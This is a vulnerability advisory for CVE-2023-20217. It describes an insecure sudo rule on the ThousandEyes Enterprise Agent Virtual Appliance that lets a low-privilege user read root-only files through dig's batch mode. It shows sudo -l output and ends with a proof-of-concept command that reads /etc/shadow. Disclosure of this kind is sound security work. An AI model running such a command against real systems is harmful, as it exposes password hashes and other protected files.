1. Vulnerability Details

Affected Vendor: ThousandEyes
Affected Product: ThousandEyes Enterprise Agent Virtual Appliance
Affected Version: thousandeyes-va-64-18.04 0.218
Platform: Linux / Ubuntu 18.04
CWE Classification: CWE-1395: Dependency on Vulnerable
Third-Party Component,
CWE-1220: Insufficient Granularity of
Access Control
CVE ID: CVE-2023-20217

2. Vulnerability Description

An insecure sudo configuration permits a low-privilege user
to read root-only files via the 'dig' command without a
password.

3. Technical Description

The ThousandEyes Virtual Appliance is distributed with a
restrictive set of commands that can be executed via sudo,
without having to provide the password for the 'thousandeyes'
account. However, the ability to execute dig via sudo,
allows for reading of arbitrary files using dig's "batch"
mode. This mode allows a user to specify a file of requests,
one per line. The dig command will read the file with elevated
privileges and display the resulting queries (i.e. file
contents) back to the user.

thousandeyes@thousandeyes-va:~$ id
uid=1000(thousandeyes) gid=1000(thousandeyes)
groups=1000(thousandeyes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)
thousandeyes@thousandeyes-va:~$ sudo -l
Matching Defaults entries for thousandeyes on thousandeyes-va:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thousandeyes may run the following commands on thousandeyes-va:
(ALL : ALL) ALL
(ALL) NOPASSWD: /bin/systemctl start te-va, /bin/systemctl stop te-va, /bin/systemctl restart te-va,
/bin/systemctl status te-va, /bin/systemctl start te-agent, /bin/systemctl stop
te-agent, /bin/systemctl restart te-agent, /bin/systemctl status te-agent, /bin/systemctl start
te-browserbot, /bin/systemctl stop te-browserbot, /bin/systemctl restart
te-browserbot, /bin/systemctl status te-browserbot, /sbin/reboot, sudoedit /etc/hosts, /usr/bin/dig,
/usr/bin/lsof, /usr/bin/apt-get update, /usr/bin/apt-get install te-agent,
/usr/bin/apt-get install te-browserbot, /usr/bin/apt-get install te-va, /usr/bin/apt-get install te-pa,
/usr/bin/apt-get install te-va-unlock, /usr/bin/apt-get install
te-intl-fonts, /usr/bin/apt-get install te-agent-utils, /usr/bin/apt-get install ntpdate,
/usr/bin/apt-cache, /usr/bin/te-*, /usr/local/bin/te-*, /usr/local/sbin/te-*
(root) NOPASSWD: /usr/sbin/ntpdate, /usr/sbin/traceroute, /usr/sbin/tcpdump

Here we see that dig is available as root with no password,
and no restrictions on the arguments it can be passed.

thousandeyes@thousandeyes-va:~$ sudo /usr/bin/dig -f /etc/shadow
